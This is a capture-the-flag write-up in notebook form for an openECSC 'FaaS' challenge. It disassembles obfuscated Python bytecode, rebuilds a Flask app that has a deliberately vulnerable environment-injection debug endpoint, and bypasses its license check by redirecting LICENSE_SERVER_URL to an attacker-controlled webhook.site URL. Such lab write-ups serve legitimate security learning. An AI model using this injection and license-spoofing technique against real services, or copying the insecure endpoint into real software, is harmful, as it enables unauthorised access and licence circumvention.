# %%
#!/usr/bin/env python3
# FaaS Flag Obfuscated File (tm)
# (c) 2025 Faas, MVM department
import marshal, base64, zlib
import dis

lic = zlib.decompress(base64.b64decode('...'))
app = zlib.decompress(base64.b64decode('...'))

# %%
lic = marshal.loads(lic)
app = marshal.loads(app)

# %%
dis.dis(lic)

# %% [markdown]
# ```py
#   0           0 RESUME                   0
#
#   1           2 LOAD_CONST               0 (0)
#               4 LOAD_CONST               1 (None)
#               6 IMPORT_NAME              0 (requests)
#               8 STORE_NAME               0 (requests)
#
#   3          10 PUSH_NULL
#              12 LOAD_BUILD_CLASS
#              14 LOAD_CONST               2 (<code object LicenseManager at 0xffff9f46d290, file "../challenge-src/faas/license.py", line 3>)
#              16 MAKE_FUNCTION            0
#              18 LOAD_CONST               3 ('LicenseManager')
#              20 CALL                     2
#              28 STORE_NAME               1 (LicenseManager)
#              30 RETURN_CONST             1 (None)
#
# Disassembly of <code object LicenseManager at 0xffff9f46d290, file "../challenge-src/faas/license.py", line 3>:
#   3           0 RESUME                   0
#               2 LOAD_NAME                0 (__name__)
#               4 STORE_NAME               1 (__module__)
#               6 LOAD_CONST               0 ('LicenseManager')
#               8 STORE_NAME               2 (__qualname__)
#
#   4          10 LOAD_CONST               1 (<code object __init__ at 0xffff9f447ee0, file "../challenge-src/faas/license.py", line 4>)
#              12 MAKE_FUNCTION            0
#              14 STORE_NAME               3 (__init__)
#
#   8          16 LOAD_CONST               2 (<code object validate_license at 0xffff9f6f4030, file "../challenge-src/faas/license.py", line 8>)
#              18 MAKE_FUNCTION            0
#              20 STORE_NAME               4 (validate_license)
#              22 RETURN_CONST             3 (None)
#
# Disassembly of <code object __init__ at 0xffff9f447ee0, file "../challenge-src/faas/license.py", line 4>:
#   4           0 RESUME                   0
#
#   5           2 LOAD_FAST                1 (license_server_url)
#               4 LOAD_FAST                0 (self)
#               6 STORE_ATTR               0 (license_server_url)
#
#   6          16 LOAD_FAST                0 (self)
#              18 LOAD_ATTR                0 (license_server_url)
#              38 LOAD_ATTR                3 (NULL|self + startswith)
#              58 LOAD_CONST               1 ('https')
#              60 CALL                     1
#              68 POP_JUMP_IF_TRUE         2 (to 74)
#              70 LOAD_ASSERTION_ERROR
#              72 RAISE_VARARGS            1
#         >>   74 RETURN_CONST             0 (None)
#
# Disassembly of <code object validate_license at 0xffff9f6f4030, file "../challenge-src/faas/license.py", line 8>:
#   8           0 RESUME                   0
#
#   9           2 NOP
#
#  10           4 LOAD_GLOBAL              1 (NULL + requests)
#              14 LOAD_ATTR                2 (post)
#              34 LOAD_FAST                0 (self)
#              36 LOAD_ATTR                4 (license_server_url)
#              56 FORMAT_VALUE             0
#              58 LOAD_CONST               1 ('/validate')
#              60 BUILD_STRING             2
#              62 LOAD_CONST               2 ('license_key')
#              64 LOAD_FAST                1 (license_key)
#              66 BUILD_MAP                1
#              68 KW_NAMES                 3 (('json',))
#              70 CALL                     2
#              78 STORE_FAST               2 (response)
#
#  11          80 LOAD_FAST                2 (response)
#              82 LOAD_ATTR                6 (status_code)
#             102 LOAD_CONST               4 (200)
#             104 COMPARE_OP              40 (==)
#             108 POP_JUMP_IF_FALSE       32 (to 174)
#
#  12         110 LOAD_FAST                2 (response)
#             112 LOAD_ATTR                9 (NULL|self + json)
#             132 CALL                     0
#             140 LOAD_ATTR               11 (NULL|self + get)
#             160 LOAD_CONST               5 ('valid')
#             162 LOAD_CONST               6 (False)
#             164 CALL                     2
#             172 RETURN_VALUE
#
#  11     >>  174 NOP
#
#  15         176 RETURN_CONST             6 (False)
#         >>  178 PUSH_EXC_INFO
#
#  13         180 POP_TOP
#
#  14         182 POP_EXCEPT
#
#  15         184 RETURN_CONST             6 (False)
#         >>  186 COPY                     3
#             188 POP_EXCEPT
#             190 RERAISE                  1
# ExceptionTable:
#   4 to 170 -> 178 [0]
#   178 to 180 -> 186 [1] lasti
# ```

# %%
dis.dis(app)
# Out:
#   0           0 RESUME                   0
#
#   1           2 LOAD_CONST               0 (0)
#               4 LOAD_CONST               1 (('Flask', 'jsonify', 'render_template', 'request'))
#               6 IMPORT_NAME              0 (flask)
#               8 IMPORT_FROM              1 (Flask)
#              10 STORE_NAME               1 (Flask)
#              12 IMPORT_FROM              2 (jsonify)
#              14 STORE_NAME               2 (jsonify)
#              16 IMPORT_FROM              3 (render_template)
#              18 STORE_NAME               3 (render_template)
#              20 IMPORT_FROM              4 (request)
#              22 STORE_NAME               4 (request)
#              24 POP_TOP
#
#   2          26 LOAD_CONST               0 (0)
#              28 LOAD_CONST               2 (None)
#              30 IMPORT_NAME              5 (os)
#              32 STORE_NAME               5 (os)
#
#   3          34 LOAD_CONST               0 (0)
# ...

# %% [markdown]
# ```python
#   0           0 RESUME                   0
#
#   1           2 LOAD_CONST               0 (0)
#               4 LOAD_CONST               1 (('Flask', 'jsonify', 'render_template', 'request'))
#               6 IMPORT_NAME              0 (flask)
#               8 IMPORT_FROM              1 (Flask)
#              10 STORE_NAME               1 (Flask)
#              12 IMPORT_FROM              2 (jsonify)
#              14 STORE_NAME               2 (jsonify)
#              16 IMPORT_FROM              3 (render_template)
#              18 STORE_NAME               3 (render_template)
#              20 IMPORT_FROM              4 (request)
#              22 STORE_NAME               4 (request)
#              24 POP_TOP
#
#   2          26 LOAD_CONST               0 (0)
#              28 LOAD_CONST               2 (None)
#              30 IMPORT_NAME              5 (os)
#              32 STORE_NAME               5 (os)
#
#   3          34 LOAD_CONST               0 (0)
#              36 LOAD_CONST               3 (('LicenseManager',))
#              38 IMPORT_NAME              6 (license)
#              40 IMPORT_FROM              7 (LicenseManager)
#              42 STORE_NAME               7 (LicenseManager)
#              44 POP_TOP
#
#   5          46 PUSH_NULL
#              48 LOAD_NAME                1 (Flask)
#              50 LOAD_NAME                8 (__name__)
#              52 CALL                     1
#              60 STORE_NAME               9 (app)
#
#   6          62 LOAD_CONST               4 ('')
#              64 STORE_GLOBAL            10 (license_key)
#
#   7          66 PUSH_NULL
#              68 LOAD_NAME                5 (os)
#              70 LOAD_ATTR               22 (getenv)
#              90 LOAD_CONST               5 ('LICENSE_SERVER_URL')
#              92 LOAD_CONST               6 ('https://openec.sc/license')
#              94 CALL                     2
#             102 STORE_NAME              12 (license_server_url)
#
#   9         104 LOAD_NAME                9 (app)
#             106 LOAD_ATTR               27 (NULL|self + route)
#             126 LOAD_CONST               7 ('/')
#             128 CALL                     1
#
#  10         136 LOAD_CONST               8 (<code object home at 0xffff9f46d610, file "../challenge-src/faas/app.py", line 9>)
#             138 MAKE_FUNCTION            0
#
#   9         140 CALL                     0
#
#  10         148 STORE_NAME              14 (home)
#
#  13         150 LOAD_NAME                9 (app)
#             152 LOAD_ATTR               27 (NULL|self + route)
#             172 LOAD_CONST               9 ('/debugger-ui')
#             174 LOAD_CONST              10 ('GET')
#             176 BUILD_LIST               1
#             178 KW_NAMES                11 (('methods',))
#             180 CALL                     2
#
#  14         188 LOAD_CONST              12 (<code object debugger_ui at 0xffff9f42f840, file "../challenge-src/faas/app.py", line 13>)
#             190 MAKE_FUNCTION            0
#
#  13         192 CALL                     0
#
#  14         200 STORE_NAME              15 (debugger_ui)
#
#  23         202 LOAD_NAME                9 (app)
#             204 LOAD_ATTR               27 (NULL|self + route)
#             224 LOAD_CONST               9 ('/debugger-ui')
#             226 LOAD_CONST              13 ('POST')
#             228 BUILD_LIST               1
#             230 KW_NAMES                11 (('methods',))
#             232 CALL                     2
#
#  24         240 LOAD_CONST              14 (<code object debugger_ui_post at 0xaaaae9aafca0, file "../challenge-src/faas/app.py", line 23>)
#             242 MAKE_FUNCTION            0
#
#  23         244 CALL                     0
#
#  24         252 STORE_NAME              16 (debugger_ui_post)
#
#  48         254 LOAD_NAME                9 (app)
#             256 LOAD_ATTR               27 (NULL|self + route)
#             276 LOAD_CONST              15 ('/flag')
#             278 LOAD_CONST              10 ('GET')
#             280 BUILD_LIST               1
#             282 KW_NAMES                11 (('methods',))
#             284 CALL                     2
#
#  49         292 LOAD_CONST              16 (<code object get_flag at 0xffff9f73d8a0, file "../challenge-src/faas/app.py", line 48>)
#             294 MAKE_FUNCTION            0
#
#  48         296 CALL                     0
#
#  49         304 STORE_NAME              17 (get_flag)
#
#  57         306 LOAD_NAME                9 (app)
#             308 LOAD_ATTR               27 (NULL|self + route)
#             328 LOAD_CONST              17 ('/license')
#             330 LOAD_CONST              10 ('GET')
#             332 BUILD_LIST               1
#             334 KW_NAMES                11 (('methods',))
#             336 CALL                     2
#
#  58         344 LOAD_CONST              18 (<code object get_license at 0xffff9f46d370, file "../challenge-src/faas/app.py", line 57>)
#             346 MAKE_FUNCTION            0
#
#  57         348 CALL                     0
#
#  58         356 STORE_NAME              18 (get_license)
#
#  61         358 LOAD_NAME                9 (app)
#             360 LOAD_ATTR               27 (NULL|self + route)
#             380 LOAD_CONST              17 ('/license')
#             382 LOAD_CONST              13 ('POST')
#             384 BUILD_LIST               1
#             386 KW_NAMES                11 (('methods',))
#             388 CALL                     2
#
#  62         396 LOAD_CONST              19 (<code object post_license at 0xffff9f6f41b0, file "../challenge-src/faas/app.py", line 61>)
#             398 MAKE_FUNCTION            0
#
#  61         400 CALL                     0
#
#  62         408 STORE_NAME              19 (post_license)
#
#  71         410 LOAD_NAME                8 (__name__)
#             412 LOAD_CONST              20 ('__main__')
#             414 COMPARE_OP              40 (==)
#             418 POP_JUMP_IF_FALSE       20 (to 460)
#
#  72         420 LOAD_NAME                9 (app)
#             422 LOAD_ATTR               41 (NULL|self + run)
#             442 LOAD_CONST              21 ('0.0.0.0')
#             444 LOAD_CONST              22 (5000)
#             446 KW_NAMES                23 (('host', 'port'))
#             448 CALL                     2
#             456 POP_TOP
#             458 RETURN_CONST             2 (None)
#
#  71     >>  460 RETURN_CONST             2 (None)
#
# Disassembly of <code object home at 0xffff9f46d610, file "../challenge-src/faas/app.py", line 9>:
#   9           0 RESUME                   0
#
#  11           2 LOAD_GLOBAL              1 (NULL + render_template)
#              12 LOAD_CONST               1 ('index.html')
#              14 CALL                     1
#              22 RETURN_VALUE
#
# Disassembly of <code object debugger_ui at 0xffff9f42f840, file "../challenge-src/faas/app.py", line 13>:
#  13           0 RESUME                   0
#
#  15           2 RETURN_CONST             1 ('\n    <form action="/debugger-ui" method="post">\n    <label for="env">Debug:</label>\n    <input type="text" name="data" placeholder="asdf">\n    <input type="submit" value="Submit">\n    </form>\n    ')
#
# Disassembly of <code object debugger_ui_post at 0xaaaae9aafca0, file "../challenge-src/faas/app.py", line 23>:
#               0 MAKE_CELL                5 (env)
#               2 MAKE_CELL                6 (subprocess)
#               4 MAKE_CELL                7 (sys)
#
#  23           6 RESUME                   0
#
#  26           8 LOAD_GLOBAL              0 (os)
#              18 LOAD_ATTR                2 (environ)
#              38 LOAD_ATTR                5 (NULL|self + copy)
#              58 CALL                     0
#              66 STORE_DEREF              5 (env)
#
#  27          68 LOAD_GLOBAL              6 (request)
#              78 LOAD_ATTR                8 (form)
#              98 LOAD_ATTR               11 (NULL|self + get)
#             118 LOAD_CONST               1 ('data')
#             120 LOAD_CONST               2 ('')
#             122 CALL                     2
#             130 STORE_FAST               0 (env_param)
#
#  30         132 LOAD_FAST                0 (env_param)
#             134 POP_JUMP_IF_FALSE       58 (to 252)
#             136 LOAD_CONST               3 ('=')
#             138 LOAD_FAST                0 (env_param)
#             140 CONTAINS_OP              0
#             142 POP_JUMP_IF_FALSE       54 (to 252)
#
#  31         144 LOAD_FAST                0 (env_param)
#             146 LOAD_ATTR               13 (NULL|self + split)
#             166 LOAD_CONST               3 ('=')
#             168 LOAD_CONST               4 (1)
#             170 CALL                     2
#             178 UNPACK_SEQUENCE          2
#             182 STORE_FAST               1 (key)
#             184 STORE_FAST               2 (value)
#
#  32         186 LOAD_FAST                2 (value)
#             188 LOAD_ATTR               15 (NULL|self + strip)
#             208 CALL                     0
#             216 LOAD_DEREF               5 (env)
#             218 LOAD_FAST                1 (key)
#             220 LOAD_ATTR               15 (NULL|self + strip)
#             240 CALL                     0
#             248 STORE_SUBSCR
#
#  34     >>  252 LOAD_CONST               5 (0)
#             254 LOAD_CONST               0 (None)
#             256 IMPORT_NAME              8 (sys)
#             258 STORE_DEREF              7 (sys)
#
#  35         260 LOAD_CONST               5 (0)
#             262 LOAD_CONST               0 (None)
#             264 IMPORT_NAME              9 (subprocess)
#             266 STORE_DEREF              6 (subprocess)
#
#  36         268 LOAD_CONST               5 (0)
#             270 LOAD_CONST               0 (None)
#             272 IMPORT_NAME             10 (threading)
#             274 STORE_FAST               3 (threading)
#
#  38         276 LOAD_CLOSURE             5 (env)
#             278 LOAD_CLOSURE             6 (subprocess)
#             280 LOAD_CLOSURE             7 (sys)
#             282 BUILD_TUPLE              3
#             284 LOAD_CONST               6 (<code object r at 0xffff9f6d4c90, file "../challenge-src/faas/app.py", line 38>)
#             286 MAKE_FUNCTION            8 (closure)
#             288 STORE_FAST               4 (r)
#
#  45         290 LOAD_FAST                3 (threading)
#             292 LOAD_ATTR               23 (NULL|self + Thread)
#             312 LOAD_FAST                4 (r)
#             314 LOAD_CONST               7 (True)
#             316 KW_NAMES                 8 (('target', 'daemon'))
#             318 CALL                     2
#             326 LOAD_ATTR               25 (NULL|self + start)
#             346 CALL                     0
#             354 POP_TOP
#
#  46         356 RETURN_CONST             9 ('Restarting...')
#
# Disassembly of <code object r at 0xffff9f6d4c90, file "../challenge-src/faas/app.py", line 38>:
#               0 COPY_FREE_VARS           3
#
#  38           2 RESUME                   0
#
#  39           4 LOAD_CONST               1 (0)
#               6 LOAD_CONST               0 (None)
#               8 IMPORT_NAME              0 (time)
#              10 STORE_FAST               0 (time)
#
#  40          12 LOAD_FAST                0 (time)
#              14 LOAD_ATTR                3 (NULL|self + sleep)
#              34 LOAD_CONST               2 (1)
#              36 CALL                     1
#              44 POP_TOP
#
#  41          46 LOAD_DEREF               2 (subprocess)
#              48 LOAD_ATTR                5 (NULL|self + Popen)
#              68 LOAD_DEREF               3 (sys)
#              70 LOAD_ATTR                6 (executable)
#              90 LOAD_CONST               3 ('faas/app.py')
#              92 BUILD_LIST               2
#              94 LOAD_DEREF               1 (env)
#              96 KW_NAMES                 4 (('env',))
#              98 CALL                     2
#             106 POP_TOP
#
#  42         108 LOAD_GLOBAL              9 (NULL + os)
#             118 LOAD_ATTR               10 (_exit)
#             138 LOAD_CONST               1 (0)
#             140 CALL                     1
#             148 POP_TOP
#             150 RETURN_CONST             0 (None)
#
# Disassembly of <code object get_flag at 0xffff9f73d8a0, file "../challenge-src/faas/app.py", line 48>:
#  48           0 RESUME                   0
#
#  51           2 LOAD_GLOBAL              1 (NULL + LicenseManager)
#              12 LOAD_GLOBAL              2 (license_server_url)
#              22 CALL                     1
#              30 STORE_FAST               0 (lm)
#
#  52          32 LOAD_FAST                0 (lm)
#              34 LOAD_ATTR                5 (NULL|self + validate_license)
#              54 LOAD_GLOBAL              6 (license_key)
#              64 CALL                     1
#              72 POP_JUMP_IF_FALSE       33 (to 140)
#
#  53          74 LOAD_GLOBAL              9 (NULL + render_template)
#              84 LOAD_CONST               1 ('flag.html')
#              86 LOAD_GLOBAL             11 (NULL + os)
#              96 LOAD_ATTR               12 (getenv)
#             116 LOAD_CONST               2 ('FLAG')
#             118 LOAD_CONST               3 ('FAKE_FLAG')
#             120 CALL                     2
#             128 KW_NAMES                 4 (('flag',))
#             130 CALL                     2
#             138 RETURN_VALUE
#
#  55     >>  140 LOAD_GLOBAL              9 (NULL + render_template)
#             150 LOAD_CONST               1 ('flag.html')
#             152 LOAD_CONST               5 ('You need to activate FaaS with a valid license key to get a flag.')
#             154 KW_NAMES                 4 (('flag',))
#             156 CALL                     2
#             164 RETURN_VALUE
#
# Disassembly of <code object get_license at 0xffff9f46d370, file "../challenge-src/faas/app.py", line 57>:
#  57           0 RESUME                   0
#
#  59           2 LOAD_GLOBAL              1 (NULL + render_template)
#              12 LOAD_CONST               1 ('license.html')
#              14 CALL                     1
#              22 RETURN_VALUE
#
# Disassembly of <code object post_license at 0xffff9f6f41b0, file "../challenge-src/faas/app.py", line 61>:
#  61           0 RESUME                   0
#
#  64           2 LOAD_GLOBAL              0 (request)
#              12 LOAD_ATTR                2 (form)
#              32 LOAD_ATTR                5 (NULL|self + get)
#              52 LOAD_CONST               1 ('license_key')
#              54 LOAD_CONST               2 ('')
#              56 CALL                     2
#              64 STORE_GLOBAL             3 (license_key)
#
#  65          66 LOAD_GLOBAL              9 (NULL + LicenseManager)
#              76 LOAD_GLOBAL             10 (license_server_url)
#              86 CALL                     1
#              94 STORE_FAST               0 (lm)
#
#  66          96 LOAD_FAST                0 (lm)
#              98 LOAD_ATTR               13 (NULL|self + validate_license)
#             118 LOAD_GLOBAL              6 (license_key)
#             128 CALL                     1
#             136 POP_JUMP_IF_FALSE       13 (to 164)
#
#  67         138 LOAD_GLOBAL             15 (NULL + render_template)
#             148 LOAD_CONST               3 ('license.html')
#             150 LOAD_CONST               4 ('License activated successfully!')
#             152 KW_NAMES                 5 (('message',))
#             154 CALL                     2
#             162 RETURN_VALUE
#
#  69     >>  164 LOAD_GLOBAL             15 (NULL + render_template)
#             174 LOAD_CONST               3 ('license.html')
#             176 LOAD_CONST               6 ('Invalid license key. Please try again.')
#             178 KW_NAMES                 5 (('message',))
#             180 CALL                     2
#             188 RETURN_VALUE
# ```

# %% [markdown]
# Lazy recovery with chaptgpt
#
# ```py
# from flask import Flask, jsonify, render_template, request
# import os
# from license import LicenseManager
#
# app = Flask(__name__)
# license_key = ""
#
# license_server_url = os.getenv("LICENSE_SERVER_URL", "https://openec.sc/license")
#
#
# @app.route("/")
# def home():
#     return render_template("index.html")
#
#
# @app.route("/debugger-ui", methods=["GET"])
# def debugger_ui():
#     return """
#     <form action="/debugger-ui" method="post">
#     <label for="env">Debug:</label>
#     <input type="text" name="data" placeholder="asdf">
#     <input type="submit" value="Submit">
#     </form>
#     """
#
#
# @app.route("/debugger-ui", methods=["POST"])
# def debugger_ui_post():
#     import sys
#     import subprocess
#     import threading
#
#     env = os.environ.copy()
#     env_param = request.form.get("data", "")
#
#     if env_param and "=" in env_param:
#         key, value = env_param.split("=", 1)
#         env[key.strip()] = value.strip()
#
#     def r():
#         import time
#         time.sleep(1)
#         subprocess.Popen([sys.executable, "faas/app.py"], env=env)
#         os._exit(0)
#
#     threading.Thread(target=r, daemon=True).start()
#     return "Restarting..."
#
#
# @app.route("/flag", methods=["GET"])
# def get_flag():
#     lm = LicenseManager(license_server_url)
#     if lm.validate_license(license_key):
#         return render_template("flag.html", flag=os.getenv("FLAG", "FAKE_FLAG"))
#     return render_template(
#         "flag.html",
#         flag="You need to activate FaaS with a valid license key to get a flag.",
#     )
#
#
# @app.route("/license", methods=["GET"])
# def get_license():
#     return render_template("license.html")
#
#
# @app.route("/license", methods=["POST"])
# def post_license():
#     global license_key
#     license_key = request.form.get("license_key", "")
#     lm = LicenseManager(license_server_url)
#     if lm.validate_license(license_key):
#         return render_template("license.html", message="License activated successfully!")
#     return render_template("license.html", message="Invalid license key. Please try again.")
#
#
# if __name__ == "__main__":
#     app.run(host="0.0.0.0", port=5000)
# ```

# %% [markdown]
# However, looking at the LicenseManger bytecode, we see that it just executes a request toward `\validate` which not part of the challenge. The overall weakness here is the `debugger_ui_post`:
#
# ```py
# @app.route("/debugger-ui", methods=["POST"])
# def debugger_ui_post():
#     import sys
#     import subprocess
#     import threading
#
#     env = os.environ.copy()
#     env_param = request.form.get("data", "")
#
#     if env_param and "=" in env_param:
#         key, value = env_param.split("=", 1)
#         env[key.strip()] = value.strip()
#
#     def r():
#         import time
#         time.sleep(1)
#         subprocess.Popen([sys.executable, "faas/app.py"], env=env)
#         os._exit(0)
#
#     threading.Thread(target=r, daemon=True).start()
#     return "Restarting..."
# ```
#
# We have the ability to inject abitrary environment vars. I think of two possible ideas:
#
# 1) Somehow start the flask debug mode `FLASK_DEBUG=1`.
# 2) Setting `LICENSE_SERVER_URL` to an attacker controlled server
#
# I think 1) will work(we need to have read access to `/proc`...), but requires a little more work as we also have to set `HOST=localhost` to fool flask. Should still be present. Let's look into 2):
#
# ```py
# Disassembly of <code object validate_license at 0xffff9f6f4030, file "../challenge-src/faas/license.py", line 8>:
#   8           0 RESUME                   0
#
#   9           2 NOP
#
#  10           4 LOAD_GLOBAL              1 (NULL + requests)
#              14 LOAD_ATTR                2 (post)
#              34 LOAD_FAST                0 (self)
#              36 LOAD_ATTR                4 (license_server_url)
#              56 FORMAT_VALUE             0
#              58 LOAD_CONST               1 ('/validate')
#              60 BUILD_STRING             2 # = license_server_url + /validate
#              62 LOAD_CONST               2 ('license_key')
#              64 LOAD_FAST                1 (license_key)
#              66 BUILD_MAP                1 # license_key = license_key
#              68 KW_NAMES                 3 (('json',))
#              70 CALL                     2
#              78 STORE_FAST               2 (response)
#
#  11          80 LOAD_FAST                2 (response)
#              82 LOAD_ATTR                6 (status_code)
#             102 LOAD_CONST               4 (200)
#             104 COMPARE_OP              40 (==) # response.status_code == 200
#             108 POP_JUMP_IF_FALSE       32 (to 174)
#
#  12         110 LOAD_FAST                2 (response)
#             112 LOAD_ATTR                9 (NULL|self + json)
#             132 CALL                     0
#             140 LOAD_ATTR               11 (NULL|self + get) # return response.json().get("valid",False))
#             160 LOAD_CONST               5 ('valid')
#             162 LOAD_CONST               6 (False)
#             164 CALL                     2
#             172 RETURN_VALUE
# ```
#
# Therefore, we need to emulate
#
# ```python
# response.status_code == 200 and response.json().get("valid",False)
# ```

# %% [markdown]
# On `webhook.site`, I configure my own webhook:

# %%
import httpx

httpx.post("https://webhook.site/33f4ea95-4756-4073-8b59-1812057de918/validate",json={"License_key":"bla"}).json()
# Out:
# {'valid': True}

# %% [markdown]
# So I define
#
# `LICENSE_SERVER_URL="https://webhook.site/33f4ea95-4756-4073-8b59-1812057de918/validate"`
#
# Ah shit
#
# ```
# https://7cad5f80-bda4-47f7-98fb-cbce566e73b6.openec.sc:1337/flag
# ```
#
# Did I define everything alright?
#
# Ohh, I shoud not add the `/validate`
#
# `LICENSE_SERVER_URL=https://webhook.site/33f4ea95-4756-4073-8b59-1812057de918`
#
# After removing `"`, everything works: `openECSC{l1c3ns3_cr4ck_f0r_pr3m1um_fl4g}`

# %% [markdown]
# ![image.png](attachment:image.png)
